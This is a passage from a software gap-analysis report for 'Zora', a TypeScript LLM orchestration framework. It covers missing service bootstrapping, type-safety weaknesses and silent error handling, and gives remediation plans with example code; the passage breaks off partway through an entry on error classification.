**Effort:** 1h | **Blocking:** Y | **Status:** Open

#### Description
HeartbeatSystem sends periodic health check signals, and RoutineManager executes scheduled tasks. Both are implemented but Orchestrator.boot() never calls their start() methods. Health checks don't run, scheduled tasks never execute, and the system has no visibility into its own health.

#### Current State
- **Location:** `/home/user/zora/src/orchestration/orchestrator.ts:50-80` (boot method)
- **Code Snippet:**
```typescript
// Current: Services not started
async boot(): Promise<void> {
  // Missing: this.heartbeatSystem.start()
  // Missing: this.routineManager.start()
  // Health checks disabled, routines never run
}
```
- **Related Gaps:** ORCH-10 (Main Orchestrator), ERR-05 (Event Stream Timeout)

#### Expected State
Orchestrator.boot() calls heartbeatSystem.start() which sends health check events every 30 seconds. Calls routineManager.start() which polls for scheduled tasks and executes them when ready. Both services log their actions for observability.

#### Why It Matters
Health checks enable proactive detection of provider failures, resource exhaustion, and other issues. Scheduled tasks are essential for periodic workloads (e.g., "run analysis every hour", "check for updates every 24 hours"). Without these, the framework is reactive only.

#### Remediation Approach
**Strategy:** In Orchestrator.boot(), call heartbeatSystem.start() and routineManager.start(). These methods schedule internal intervals (30s for heartbeat, 1s polling for routines). Both services emit events to ExecutionLoop's event stream.

**Affected Files:**
- `/home/user/zora/src/orchestration/orchestrator.ts` — Add .start() calls in boot()
- `/home/user/zora/src/orchestration/heartbeat-system.ts` — Ensure start() method exists
- `/home/user/zora/src/orchestration/routine-manager.ts` — Ensure start() method exists

**Dependencies:** ORCH-10 (Orchestrator instantiation), ERR-05 (Event stream timeout handling)

**Test Coverage:**
- Verify HeartbeatSystem emits health event every 30 seconds
- Verify RoutineManager executes task when scheduled time arrives
- Verify services gracefully handle missing providers (error logged, not crashed)

**Definition of Done:**
- [ ] HeartbeatSystem.start() called in Orchestrator.boot()
- [ ] RoutineManager.start() called in Orchestrator.boot()
- [ ] Health checks emit every 30 seconds
- [ ] Scheduled tasks execute at scheduled times
- [ ] Integration test verifies background services operational

---

### ORCH-10: No Main Orchestrator Bootstrapping
**Severity:** S1 | **Functionality Impact:** 5 | **Reliability:** 5 | **Security:** 4
**Effort:** 3h | **Blocking:** Y | **Status:** Open

#### Description
The most critical gap: there is no central Orchestrator class or boot sequence. Individual components (FailoverController, RetryQueue, AuthMonitor, SessionManager, Router, HeartbeatSystem, RoutineManager) are implemented but never instantiated or wired together. CLI and application startup manually create components, duplicating logic and preventing coordinated operation. The framework cannot start as a cohesive system.

#### Current State
- **Location:** `/home/user/zora/src/index.ts:1-50` (CLI entry point)
- **Code Snippet:**
```typescript
// Current: Manual, duplicated wiring
import { ClaudeProvider } from './providers/claude';
import { ExecutionLoop } from './orchestration/execution-loop';
// ... 20 more manual imports and instantiations

async function main() {
  const claude = new ClaudeProvider(config.claude);
  const executionLoop = new ExecutionLoop(claude);
  // Missing: centralized Orchestrator wiring
  // Missing: service startup coordination
  // Missing: dependency injection
}
```
- **Related Gaps:** All ORCH-* gaps depend on this (ORCH-01 through ORCH-09)

#### Expected State
A central Orchestrator class handles all initialization:
```typescript
const orchestrator = new Orchestrator(config);
await orchestrator.boot(); // Starts all services in dependency order
const result = await orchestrator.submitTask(task);
```

#### Why It Matters
This gap blocks all other orchestration gaps. Without a central orchestrator, components cannot coordinate. The framework cannot operate as a system; instead, it's a collection of unconnected parts. Production deployment is impossible.

#### Remediation Approach
**Strategy:** Create Orchestrator class with boot() method that instantiates all services in dependency order: (1) providers, (2) routing, (3) execution loop, (4) retry queue consumer, (5) failover controller, (6) session manager, (7) auth monitor, (8) heartbeat system, (9) routine manager, (10) steering manager. Orchestrator exposes submitTask(), queryStatus(), and shutdown() methods.

**Affected Files:**
- `/home/user/zora/src/orchestration/orchestrator.ts` — Create/expand class with boot() and service management
- `/home/user/zora/src/index.ts` — Replace manual wiring with `const orchestrator = new Orchestrator(config); await orchestrator.boot();`
- `/home/user/zora/src/commands/*.ts` — Update all CLI commands to use orchestrator.submitTask()

**Dependencies:** None directly; but must be completed before ORCH-01 through ORCH-09

**Test Coverage:**
- Verify all services instantiated in boot()
- Verify boot() completes without errors
- Verify submitTask() flows through ExecutionLoop
- Verify shutdown() gracefully stops all services
- Integration test verifies orchestrator can handle complete task lifecycle

**Definition of Done:**
- [ ] Orchestrator class created with boot(), submitTask(), shutdown()
- [ ] All services instantiated in boot() in correct dependency order
- [ ] CLI updated to use Orchestrator.submitTask()
- [ ] No manual provider/service wiring in CLI
- [ ] Integration test verifies end-to-end task submission and completion

---

### ORCH-11: Round-Robin Mode Actually Random
**Severity:** S4 | **Functionality Impact:** 1 | **Reliability:** 1 | **Security:** 1
**Effort:** 30min | **Blocking:** N | **Status:** Open

#### Description
Router has a "round-robin" mode option that should cycle through providers in order (Claude → Ollama → Gemini → Claude...). However, the implementation uses Math.random() instead of sequential cycling. This is purely a naming/behavioral mismatch; functionally the system works, but it's misleading.

#### Current State
- **Location:** `/home/user/zora/src/orchestration/router.ts:100-120` (provider selection)
- **Code Snippet:**
```typescript
// Current: Random, not round-robin
selectProvider(mode: 'round-robin' | 'classification'): LLMProvider {
  if (mode === 'round-robin') {
    const idx = Math.floor(Math.random() * this.providers.length);
    return this.providers[idx]; // Random!
  }
  // ... classification logic
}
```
- **Related Gaps:** ORCH-03 (Router Integration)

#### Expected State
Round-robin mode maintains a sequence counter. Each call increments counter and returns providers[counter % providers.length]. Cycles through all providers in order.

#### Why It Matters
This is cosmetic and doesn't block production. However, it causes confusion during load balancing testing and violates principle of least surprise. Users selecting "round-robin" expect deterministic cycling, not randomness.

#### Remediation Approach
**Strategy:** Maintain a round-robin index counter in Router. Each selectProvider() call (when mode is round-robin) increments counter and returns providers[counter % providers.length]. Reset counter after cycling through all providers.

**Affected Files:**
- `/home/user/zora/src/orchestration/router.ts` — Add roundRobinIndex property, fix selectProvider() logic

**Dependencies:** None - independent fix

**Test Coverage:**
- Select provider with round-robin mode 5 times → verify order is [Claude, Ollama, Gemini, Claude, Ollama]
- Verify cycling is deterministic, not random

**Definition of Done:**
- [ ] Round-robin mode uses index-based cycling, not Math.random()
- [ ] Sequence is deterministic and repeatable
- [ ] Unit test verifies round-robin order

---

## 7. TYPE SAFETY GAPS (8 gaps)

### Root Cause Analysis

**Problem:** The Zora codebase relies heavily on TypeScript escape hatches (`as any`, `catch (err: any)`) to work around type system constraints. This approach sacrifices compile-time safety for short-term development convenience, creating maintenance debt and runtime vulnerability. Event definitions lack structure, provider configurations lack hierarchy, and critical functions lack explicit return types.

**Risk Profile:**
- **Immediate:** Refactoring across modules introduces silent type errors
- **Operational:** Runtime type mismatches cause exceptions in production
- **Maintenance:** IDE autocompletion fails; refactoring tools unreliable
- **Onboarding:** New developers cannot reason about code contracts

---

#### TYPE-01: 36 `as any` Assertions in Providers

**Severity:** S3 (Medium)
**Effort:** 3h
**Blocking:** N
**Files Affected:** 3
**Impact Level:** 2/5

**Description:**

Event content is coerced with `as any` in multiple provider implementations, bypassing type checking entirely. This occurs across Claude, Gemini, and Ollama providers when processing event responses.

**Current State:**
- `claude-provider.ts`: Lines where event content is assigned with `as any` (e.g., event payload casting)
- `gemini-provider.ts`: Response parsing assigns `as any` to avoid type validation
- `ollama-provider.ts`: Event content structures bypass interface definitions

**Problem:**
- No per-type interfaces for different event content shapes
- Callers cannot trust event structure; runtime validation missing
- Type narrowing impossible downstream; all consumers must re-type-assert
- Refactoring event structures risks breaking all three providers silently

**Solution:**
1. Create discriminated union for event payloads:
   ```typescript
   type TextEventPayload = { type: 'text'; content: string };
   type ToolCallEventPayload = { type: 'tool_call'; tool: string; args: Record<string, unknown> };
   type ErrorEventPayload = { type: 'error'; message: string; code: string };
   type EventPayload = TextEventPayload | ToolCallEventPayload | ErrorEventPayload;
   ```

2. Replace `as any` assertions with explicit payload construction:
   ```typescript
   // Before:
   const event = { content: response } as any;

   // After:
   const event: TextEventPayload = { type: 'text', content: response };
   ```

3. Update provider interfaces to use typed payloads

**Verification:**
- TypeScript strict mode reports zero `as any` in provider files
- Event consumers use discriminated union narrowing (e.g., `if (payload.type === 'text')`)
- Providers emit events with explicit type information

---

#### TYPE-02: `err: unknown` Not Properly Narrowed

**Severity:** S3 (Medium)
**Effort:** 2h
**Blocking:** N
**Files Affected:** 8+
**Impact Level:** 2/5

**Description:**

Error handling throughout the codebase catches errors as `unknown` or `any` without proper type narrowing. Eight or more locations use `catch (err: any)` instead of applying `instanceof Error` checks or custom type guards.

**Current State:**
- Catch blocks access `.message`, `.stack` without verifying type
- Non-Error objects (strings, numbers) thrown by third-party code cause crashes
- Error classification logic (e.g., `ERR-04`) cannot safely inspect error details
- Logging may fail when attempting to serialize non-standard error objects

**Problem:**
- `catch (err: any)` defeats error handling safety
- No distinction between typed errors (Error, HttpError, TimeoutError) and arbitrary objects
- Downstream code assumes properties that may not exist
- Type guard helpers not extracted to reusable utilities

**Solution:**
1. Create error type guard helpers:
   ```typescript
   function isError(value: unknown): value is Error {
     return value instanceof Error;
   }

   function isHttpError(value: unknown): value is HttpError {
     return value instanceof HttpError;
   }

   function getErrorMessage(err: unknown): string {
     if (isError(err)) return err.message;
     if (typeof err === 'string') return err;
     return 'Unknown error';
   }
   ```

2. Update all catch blocks:
   ```typescript
   // Before:
   catch (err: any) {
     console.log(err.message); // May crash
   }

   // After:
   catch (err: unknown) {
     if (isError(err)) {
       logger.error({ message: err.message, stack: err.stack });
     } else {
       logger.error({ message: getErrorMessage(err) });
     }
   }
   ```

3. Add `noImplicitAny: true` to tsconfig to enforce explicit types in catch clauses

**Verification:**
- Zero `catch (err: any)` clauses remaining
- All error handling uses type guards before property access
- Tests confirm handling of non-Error thrown values

---

#### TYPE-03: TaskContext History Type Is `any[]`

**Severity:** S3 (Medium)
**Effort:** 4h
**Blocking:** N
**Files Affected:** 2
**Impact Level:** 2/5

**Description:**

The `TaskContext.history` field is typed as `any[]`, preventing type-safe access to historical events. This undermines the event system's ability to provide guarantees about event structure and timing.

**Current State:**
- `TaskContext` interface defines `history?: any[]`
- Code cannot rely on history containing valid `AgentEvent` instances
- No discriminated union narrowing possible on historical events
- Memory/context injection code (ORCH-07) cannot validate history shape

**Problem:**
- Callers must re-validate and re-type events accessed from history
- No compile-time guarantee that history contains Events
- Corrupted or malformed history entries cause runtime failures
- Refactoring event definitions requires manual validation code updates

**Solution:**
1. Define complete event hierarchy with discriminated union:
   ```typescript
   interface BaseAgentEvent {
     id: string;
     timestamp: number;
     source: 'provider' | 'system' | 'user';
     sequence: number;
   }

   interface TextEvent extends BaseAgentEvent {
     type: 'text';
     content: string;
   }

   interface ToolCallEvent extends BaseAgentEvent {
     type: 'tool_call';
     tool: string;
     args: Record<string, unknown>;
   }

   interface ErrorEvent extends BaseAgentEvent {
     type: 'error';
     message: string;
     code: string;
   }

   type AgentEvent = TextEvent | ToolCallEvent | ErrorEvent;
   ```

2. Update TaskContext:
   ```typescript
   interface TaskContext {
     history: AgentEvent[]; // No longer any[]
   }
   ```

3. Replace history access with type-safe narrowing:
   ```typescript
   // Before:
   const lastEvent = context.history[0] as any;
   console.log(lastEvent.content);

   // After:
   const lastEvent = context.history[0];
   if (lastEvent && lastEvent.type === 'text') {
     console.log(lastEvent.content);
   }
   ```

**Verification:**
- `TaskContext.history: AgentEvent[]` (not `any[]`)
- All history access uses discriminated union narrowing
- Type errors reported if accessing `.content` on non-text events

---

#### TYPE-04: ProviderConfig Missing Type Hierarchy

**Severity:** S3 (Medium)
**Effort:** 2h
**Blocking:** N
**Files Affected:** 1
**Impact Level:** 2/5

**Description:**

Provider configuration uses a single flat `ProviderConfig` interface for all providers (Claude, Gemini, Ollama). This prevents type-specific validation and IDE assistance for provider-specific settings.

**Current State:**
- Single `ProviderConfig` with union of all possible fields
- No way to enforce that Claude-specific fields only appear in Claude config
- Type checking cannot catch configuration mistakes (e.g., Ollama-specific field in Claude config)
- Config validation must check fields manually at runtime

**Problem:**
- Configuration polymorphism not reflected in type system
- IDEs cannot offer autocomplete for provider-specific settings
- Typos in config keys not caught at compile time
- Documentation must describe all fields; reader must filter by provider

**Solution:**
1. Create base and provider-specific config types:
   ```typescript
   interface BaseProviderConfig {
     type: 'claude' | 'gemini' | 'ollama';
     maxTokens?: number;
     temperature?: number;
   }

   interface ClaudeProviderConfig extends BaseProviderConfig {
     type: 'claude';
     apiKey: string;
     model: 'claude-3-opus' | 'claude-3-sonnet' | 'claude-3-haiku';
   }

   interface GeminiProviderConfig extends BaseProviderConfig {
     type: 'gemini';
     apiKey: string;
     model: 'gemini-pro' | 'gemini-pro-vision';
   }

   interface OllamaProviderConfig extends BaseProviderConfig {
     type: 'ollama';
     baseUrl: string;
     model: string;
     pullIfMissing?: boolean;
   }

   type ProviderConfig = ClaudeProviderConfig | GeminiProviderConfig | OllamaProviderConfig;
   ```

2. Update provider instantiation for type safety:
   ```typescript
   // Before:
   const config: ProviderConfig = getUserConfig();
   const provider = createProvider(config); // Cannot verify type match

   // After:
   const config: ProviderConfig = getUserConfig();
   if (config.type === 'claude' && config.type in claudeConfig) {
     const provider = createClaudeProvider(config);
   }
   ```

3. Use discriminated union in config loading/validation

**Verification:**
- TypeScript reports error if `claudeConfig.pullIfMissing` used (Ollama-only field)
- IDEs offer provider-specific fields in autocomplete
- Runtime config validation uses type guards

---

#### TYPE-05: Silent `JSON.parse()` Errors in Providers

**Severity:** S2 (High)
**Effort:** 1h
**Blocking:** N (but high-risk)
**Files Affected:** 3
**Impact Level:** 4/5

**Description:**

Multiple providers silently swallow JSON parsing errors, losing tool invocations and other critical structured data. Errors are caught and ignored, preventing both diagnosis and recovery.

**Current State:**
- `gemini-provider.ts` lines 256, 272: `try { JSON.parse() } catch { }`
- `ollama-provider.ts` line 171: Silent JSON error
- Malformed JSON from provider APIs is dropped without logging
- Tool calls silently disappear; user receives no notification

**Problem:**
- Production failures go undetected
- Debugging is nearly impossible; no error record
- Tool invocations lost permanently (cannot retry)
- User sees request succeed but tool never executes

**Solution:**
1. Create error event instead of silencing:
   ```typescript
   // Before:
   try {
     const toolCall = JSON.parse(response);
     // use toolCall
   } catch {
     // Silent failure
   }

   // After:
   let toolCall: unknown;
   try {
     toolCall = JSON.parse(response);
   } catch (err) {
     this.emit('error', {
       type: 'parse_error',
       message: `Failed to parse JSON: ${err instanceof Error ? err.message : String(err)}`,
       rawContent: response,
       source: 'gemini-provider'
     });
     return;
   }

   // Validate structure
   if (!isValidToolCall(toolCall)) {
     this.emit('error', {
       type: 'invalid_tool_call',
       message: 'Parsed JSON did not match ToolCall schema',
       payload: toolCall,
       source: 'gemini-provider'
     });
     return;
   }
   ```

2. Add validation helpers:
   ```typescript
   function isValidToolCall(value: unknown): value is ToolCall {
     return (
       typeof value === 'object' &&
       value !== null &&
       'tool' in value &&
       'args' in value &&
       typeof (value as any).tool === 'string'
     );
   }
   ```

3. Update error handling to emit events with context

**Verification:**
- Zero `catch { }` blocks in provider files (all errors logged or re-emitted)
- Integration tests confirm error events emitted for malformed JSON
- Audit logs show parse failures with raw content for diagnosis

---

#### TYPE-06: No Type Definitions for Event Payloads

**Severity:** S3 (Medium)
**Effort:** 2h
**Blocking:** N
**Files Affected:** 5
**Impact Level:** 2/5

**Description:**

Event payloads throughout the system are typed as `Record<string, any>`, providing no structure or safety. Consumers cannot rely on content shape; IDE assistance unavailable.

**Current State:**
- Event payload is generic object; no schema enforcement
- Different event types (text, tool call, error) mixed without distinction
- Payload structure documented only in comments or READMEs
- Consumers must implement their own validation logic

**Problem:**
- Runtime errors when payload structure assumed incorrectly
- Refactoring payloads requires finding all consumers manually
- IDE offers no completion; developers must remember field names
- No compile-time guarantee of payload validity

**Solution:**
1. Create payload type definitions (similar to TYPE-01's discriminated union):
   ```typescript
   interface TextPayload {
     type: 'text';
     content: string;
     metadata?: Record<string, unknown>;
   }

   interface ToolCallPayload {
     type: 'tool_call';
     tool: string;
     args: Record<string, unknown>;
     callId: string;
   }

   interface ToolResultPayload {
     type: 'tool_result';
     callId: string;
     result: unknown;
     error?: string;
   }

   interface ErrorPayload {
     type: 'error';
     message: string;
     code: string;
     details?: Record<string, unknown>;
   }

   type EventPayload = TextPayload | ToolCallPayload | ToolResultPayload | ErrorPayload;
   ```

2. Update event emission:
   ```typescript
   // Before:
   this.emit('event', { type: 'text', content: 'hello' } as any);

   // After:
   const payload: TextPayload = { type: 'text', content: 'hello' };
   this.emit('event', payload);
   ```

3. Update consumers to use narrowed types:
   ```typescript
   onEvent(event: { payload: EventPayload }) {
     if (event.payload.type === 'text') {
       console.log(event.payload.content); // TS knows this is string
     }
   }
   ```

**Verification:**
- All event emissions typed against `EventPayload` discriminated union
- IDE offers field suggestions for each payload type
- TypeScript reports error if accessing non-existent fields on specific types

---

#### TYPE-07: LLMProvider Union Types Underutilized

**Severity:** S3 (Medium)
**Effort:** 2h
**Blocking:** N
**Files Affected:** 1
**Impact Level:** 2/5

**Description:**

The `LLMProvider` type forms a union of provider implementations, but this union is not leveraged for exhaustiveness checking or type-safe provider selection. Code treats providers generically instead of using discriminated union patterns.

**Current State:**
- `type LLMProvider = Claude | Gemini | Ollama` defined but not used for narrowing
- Provider selection logic doesn't use type guards
- No compile-time check for handling all provider types
- Factory functions lack exhaustiveness validation

**Problem:**
- Adding new provider type doesn't trigger compile errors in handler code
- Logic gaps only discovered at runtime
- Code cannot safely use provider-specific features (type narrowing fails)
- Refactoring provider interface affects all consumers uncaught

**Solution:**
1. Create discriminated union with provider type field:
   ```typescript
   interface BaseProvider {
     type: 'claude' | 'gemini' | 'ollama';
     invoke(prompt: string): Promise<string>;
   }

   interface ClaudeProvider extends BaseProvider {
     type: 'claude';
     model: string;
   }

   interface GeminiProvider extends BaseProvider {
     type: 'gemini';
     vision?: boolean;
   }

   interface OllamaProvider extends BaseProvider {
     type: 'ollama';
     pullIfMissing: boolean;
   }

   type LLMProvider = ClaudeProvider | GeminiProvider | OllamaProvider;
   ```

2. Use exhaustiveness checking in handlers:
   ```typescript
   // Before:
   function handleProvider(provider: LLMProvider) {
     if (provider.type === 'claude') { /* ... */ }
     // Compiler doesn't verify all types handled
   }

   // After:
   function handleProvider(provider: LLMProvider): void {
     switch (provider.type) {
       case 'claude':
         // Claude-specific logic
         break;
       case 'gemini':
         // Gemini-specific logic
         break;
       case 'ollama':
         // Ollama-specific logic
         break;
       default:
         const exhaustive: never = provider;
         throw new Error(`Unhandled provider: ${exhaustive}`);
     }
   }
   ```

3. Add type guards for safe provider casting:
   ```typescript
   function isClaude(provider: LLMProvider): provider is ClaudeProvider {
     return provider.type === 'claude';
   }

   function isGemini(provider: LLMProvider): provider is GeminiProvider {
     return provider.type === 'gemini';
   }
   ```

**Verification:**
- TypeScript reports "not all code paths return value" if switch case missing
- Provider factory uses exhaustiveness checking
- Type guards used in provider-specific logic paths

---

#### TYPE-08: Missing Return Type Annotations

**Severity:** S4 (Low)
**Effort:** 1h
**Blocking:** N
**Files Affected:** 20
**Impact Level:** 1/5

**Description:**

Approximately 20 functions lack explicit return type annotations. This includes critical functions like `_parseToolCalls()`, `_mapEventPayload()`, and various utility functions. Without annotations, return types are inferred and may change silently during refactoring.

**Current State:**
- Functions use implicit return type inference
- IDE shows inferred types but lacks explicit documentation
- Callers cannot rely on return type stability across versions
- Refactoring may accidentally change return type unnoticed

**Problem:**
- Return type changes silently if implementation modified
- Callers may depend on return type not being `any` or `undefined`
- Code review difficult; return contract unclear
- Type narrowing downstream depends on understanding return type

**Solution:**
1. Add explicit return type annotations to all functions:
   ```typescript
   // Before:
   function _parseToolCalls(response: string) {
     // Implementation...
   }

   // After:
   function _parseToolCalls(response: string): ToolCall[] {
     // Implementation...
   }
   ```

2. Include return type in signature, even if inferred:
   ```typescript
   function extractEventType(event: AgentEvent): string {
     return event.type;
   }

   async function fetchProvider(id: string): Promise<LLMProvider | null> {
     // Implementation...
   }

   function mapErrorToPayload(error: unknown): ErrorPayload {
     // Implementation...
   }
   ```

3. Use `noImplicitAny: true` and `declaration: true` in tsconfig to enforce

**Verification:**
- TypeScript strict mode reports zero implicit any function return types
- `tsc --noImplicitAny` produces no errors
- All exported functions have explicit return types

---

### Summary Table: Type Safety Gaps

| Gap ID | Title | Severity | Effort | Files | Risk |
|--------|-------|----------|--------|-------|------|
| TYPE-01 | 36 `as any` Assertions | S3 | 3h | 3 | Silent type errors on refactor |
| TYPE-02 | `err: unknown` Not Narrowed | S3 | 2h | 8+ | Crashes on non-Error throws |
| TYPE-03 | TaskContext History `any[]` | S3 | 4h | 2 | Event validation gaps |
| TYPE-04 | ProviderConfig Missing Hierarchy | S3 | 2h | 1 | Config validation at runtime only |
| TYPE-05 | Silent JSON.parse() Errors | S2 | 1h | 3 | Tool invocations lost |
| TYPE-06 | No Event Payload Types | S3 | 2h | 5 | Runtime payload errors |
| TYPE-07 | LLMProvider Underutilized Unions | S3 | 2h | 1 | Missing exhaustiveness checks |
| TYPE-08 | Missing Return Annotations | S4 | 1h | 20 | Implicit type changes |

**Cumulative Effort:** 17 hours
**Cumulative Impact:** 22/40 (medium quality degradation)

---

## 8. ERROR HANDLING GAPS (6 gaps)

### Root Cause Analysis

**Problem:** The Zora framework has silent failures in security-critical and core operational paths. Error handling either swallows exceptions completely, classifies errors too simplistically, or lacks timeout protection on critical operations. These gaps create data loss risks (audit logs, tool invocations), operational blindness, and production availability risks.

**Risk Profile:**
- **Immediate (S1):** Audit logs and tool invocations silently lost; data loss undetectable
- **Operational (S2):** Steering flags ignored invisibly; event streams hang indefinitely; error handling fails across provider variants
- **Security (S3):** Shell command parsing has edge cases that bypass security restrictions
- **Observability:** Configuration failures completely hidden; errors impossible to diagnose

---

#### ERR-01: AuditLogger Silent Write Failures

**Severity:** S1 (Critical)
**Effort:** 1h
**Blocking:** Yes
**Category:** SECURITY-CRITICAL
**Files Affected:** 1
**Impact Level:** 5/5

**Description:**

The AuditLogger implements empty catch blocks that silently swallow write failures at a critical juncture:

```typescript
// Problematic code at security/audit-logger.ts:52
.catch(() => {})  // Silent failure - no logging, no retry, no alerting
```

When audit log writes fail (due to disk space, permission errors, database connection loss, filesystem errors, etc.), the errors are completely suppressed without any notification mechanism. This creates cascading risks:

**Specific Failure Modes:**
- Disk full: Audit writes fail silently; compliance violation undetected
- Permission error: Audit subsystem non-functional; no alerting
- Network loss (remote audit): Audit trail permanently incomplete
- Corruption during write: Data loss hidden indefinitely

**Impact Assessment:**
- **Data Loss Risk:** CRITICAL - Audit events vanish without trace, violating audit trail integrity
- **Compliance Impact:** CRITICAL - Violates SOC2, HIPAA, GDPR audit logging requirements
- **Operational Impact:** SEVERE - SRE has no visibility into audit subsystem health; cannot intervene
- **Security Impact:** Undetectable security incidents cannot be retrospectively investigated

**Recommended Solution:**

1. **Replace empty catch with structured error handling:**
   ```typescript
   .catch((err) => {
     // Log to fallback system (stderr, file, metrics)
     const errMsg = err instanceof Error ? err.message : String(err);
     console.error(`[AUDIT_CRITICAL] Write failed: ${errMsg}`);

     // Emit metric/alert
     metrics.increment('audit.write_failures');
     alerting.critical('AuditLogger write failure', { error: errMsg });

     // Implement exponential backoff retry
     if (this.retryCount < MAX_RETRIES) {
       setTimeout(() => retryWrite(), Math.pow(2, this.retryCount) * 1000);
     }
   })
   ```

2. **Implement dual-write for critical audit events:**
   - Primary write to main audit storage
   - Secondary write to fallback storage (file, syslog)
   - Emit both succeed/fail outcomes

3. **Add circuit breaker pattern:**
   - After N consecutive failures, halt operations and alert
   - Prevent cascade of lost audit events

4. **Operational dashboard:**
   - Monitor audit subsystem health
   - Track write latency and failure rates
   - Alert on degraded performance

**Success Criteria:**
- All audit write errors logged with full context (timestamp, error details)
- Alert fired within 30s of first failure
- Zero silent failures in audit write path
- Audit subsystem health queryable via metrics/status endpoint

**Verification:**
- Integration tests verify errors are logged and metricated
- Operational monitoring confirms alerts fire on write failures
- No unhandled promise rejections in audit path

---

#### ERR-02: GeminiProvider Silent JSON Parse Failures

**Severity:** S1 (Critical)
**Effort:** 1h
**Blocking:** Yes
**Category:** DATA LOSS
**Files Affected:** 1
**Impact Level:** 5/5

**Description:**

The GeminiProvider discards malformed JSON responses in empty catch blocks at multiple critical points:

```typescript
// Problematic code at gemini-provider.ts:256, 272
try {
  const parsed = JSON.parse(response);
  // process parsed tool invocation
} catch (e) {
  // Silent failure - tool invocation completely lost
}
```

When the Gemini API returns malformed JSON (corrupted response, streaming error, encoding issue, truncated payload, API version change), the error is silently swallowed and:

**Specific Failure Modes:**
- Streaming timeout: Partial JSON dropped; no error event
- Encoding issue: Invalid UTF-8 silently fails to parse
- API version mismatch: Expected JSON structure changed; parse fails
- Network corruption: Response truncated mid-stream; invalid JSON
- Tool call response: Invocation lost; user work disappears

**Impact Assessment:**
- **Functional Impact:** CRITICAL - Core functionality (tool invocation) broken
- **User Impact:** SEVERE - Tool calls silently disappear; users unaware requests failed
- **Data Loss:** Tool results never received; work permanently lost
- **Debug Difficulty:** Impossible to diagnose without detailed logging; appears to work but produces nothing
- **Scale of Impact:** Every tool call failure is invisible; users have no feedback

**Recommended Solution:**

1. **Replace empty catch blocks with structured error handling:**
   ```typescript
   let toolCall: unknown;
   try {
     toolCall = JSON.parse(response);
   } catch (err) {
     const errMsg = err instanceof Error ? err.message : String(err);
     this.emit('error', {
       type: 'parse_error',
       message: `Failed to parse JSON from Gemini: ${errMsg}`,
       rawContent: response.slice(0, 500), // Log first 500 chars for diagnosis
       source: 'gemini-provider',
       timestamp: Date.now()
     });
     logger.error(`GeminiProvider JSON parse failed: ${errMsg}`, {
       rawResponse: response.slice(0, 500)
     });
     return; // Don't process further
   }
   ```

2. **Add strict validation of JSON structure:**
   ```typescript
   // Validate structure before use
   function isValidToolCall(value: unknown): value is ToolCall {
     return (
       typeof value === 'object' &&
       value !== null &&
       'tool' in value &&
       'args' in value &&
       typeof (value as any).tool === 'string' &&
       typeof (value as any).args === 'object'
     );
   }

   if (!isValidToolCall(toolCall)) {
     this.emit('error', {
       type: 'invalid_tool_call',
       message: 'Parsed JSON did not match ToolCall schema',
       payload: toolCall,
       source: 'gemini-provider'
     });
     return;
   }
   ```

3. **Emit detailed observability:**
   - Metrics: parse_errors, invalid_schema errors per provider
   - Traces: full request/response cycle including raw payload
   - Logs: JSON parse errors with context for debugging

4. **Implement error propagation to retry/failover:**
   - Errors must bubble up to FailoverController
   - Allows retry with alternate provider
   - Never silently drop invocations

**Success Criteria:**
- No silent failures in JSON parsing path
- 100% of parse errors logged with full context and raw content
- Tool invocations never lost without notification
- Errors propagate to caller for retry/failover handling
- Integration tests confirm error events emitted for malformed JSON

**Verification:**
- Zero `catch { }` blocks in GeminiProvider (all errors logged)
- End-to-end tests with malformed responses confirm error events fire
- Audit logs show parse failures with raw content for diagnosis
- Monitoring dashboard tracks parse errors by type

---

#### ERR-03: FlagManager Silently Skips Corrupted Files

**Severity:** S2 (High)
**Effort:** 1h
**Blocking:** No
**Category:** OBSERVABILITY
**Files Affected:** 1
**Impact Level:** 4/5

**Description:**

The FlagManager implements four separate catch blocks that swallow file loading errors without any logging or context:

```typescript
// Pattern repeated at steering/flag-manager.ts:96, 102, 132, 188
try {
  // load and parse config file
  const config = readFileSync(path, 'utf-8');
  const parsed = JSON.parse(config);
  // merge into flags
} catch (e) {
  // Silent failure - no logging, no context, no indication
}
```

When configuration files are corrupted, missing, unreadable, or contain invalid JSON, errors are completely hidden from operators and developers:

**Specific Failure Modes:**
- File not found: Optional config silently ignored (expected) or required config missing (critical)
- File unreadable: Permission issue unknown to SRE
- Invalid JSON: Config partially loaded; flags in inconsistent state
- Encoding error: UTF-8 file with invalid encoding silently fails

**Impact Assessment:**
- **Observability Impact:** HIGH - Configuration errors completely hidden
- **Operational Impact:** SEVERE - Troubleshooting becomes guesswork; steering flags mysteriously ignored
- **System Reliability:** UNKNOWN - Configuration state non-deterministic
- **Startup Health:** No indication if system started with complete configuration

**Recommended Solution:**

1. **Implement comprehensive logging in all four catch blocks:**
   ```typescript
   try {
     const config = readFileSync(filePath, 'utf-8');
     const parsed = JSON.parse(config);
     return parsed;
   } catch (err) {
     const errMsg = err instanceof Error ? err.message : String(err);
     const errorType = err instanceof SyntaxError ? 'parse_error' : 'read_error';

     logger.warn(`FlagManager: Failed to load config file`, {
       path: filePath,
       errorType,
       error: errMsg,
       timestamp: Date.now()
     });

     // Emit diagnostic event for observability
     this.diagnostics.push({
       file: filePath,
       status: 'failed',
       reason: errMsg,
       timestamp: Date.now()
     });

     // For required files, throw; for optional, return default
     if (this.isRequired(filePath)) {
       throw new Error(`Required flag file missing: ${filePath}`);
     }
     return null; // Optional file not found
   }
   ```

2. **Classify errors by type:**
   - File not found (benign if optional, critical if required)
   - File unreadable (permission issue - operational)
   - File corrupted (JSON parse error - data quality)
   - File valid but config invalid (schema error - configuration)

3. **Add health checks and diagnostics:**
   ```typescript
   getConfigStatus(): ConfigStatus {
     return {
       filesLoaded: this.successCount,
       filesFailed: this.failureCount,
       failedFiles: this.diagnostics.filter(d => d.status === 'failed'),
       timestamp: Date.now()
     };
   }
   ```

4. **Emit startup diagnostics:**
   - Log final state of all loaded configs
   - Log all files that failed to load with reasons
   - Make config status queryable via API/CLI
   - Display on dashboard

**Success Criteria:**
- All config load failures logged with full context (path, error, error type)
- Configuration diagnostics available via API/CLI query
- Zero configuration errors without logged explanation
- Startup log includes summary of config loading results
- Steering flags always reflect actual configuration state

**Verification:**
- Integration tests verify logging for each error type
- Health check API returns configuration status
- Startup logs reviewed for completeness in test environment

---

#### ERR-04: Fragile Error Classification via String Matching

**Severity:** S2 (High)
**Effort:** 2h
**Blocking:** Medium
**Category:** RELIABILITY
**Files Affected:** 1
**Impact Level:** 3/5

**Description:**

The FailoverController classifies errors using brittle string matching on error messages, which fails across provider variants and API version changes:

```typescript
// Fragile pattern at orchestrator/failover-controller.ts:132-141
